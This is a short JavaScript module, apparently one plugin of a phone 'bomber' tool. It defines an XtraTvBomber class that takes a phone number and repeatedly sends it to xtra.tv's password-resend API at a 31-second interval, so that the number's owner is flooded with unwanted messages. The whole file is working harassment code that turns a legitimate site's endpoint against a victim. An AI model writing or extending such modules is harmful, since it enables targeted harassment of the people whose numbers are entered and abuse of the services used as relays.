const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class XtraTvBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            login: this.phone
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "xtratv";
    delay = 31000;
    url = `https://my.xtra.tv/api/password/resend?lang=uk`;  
}
module.exports = XtraTvBomber;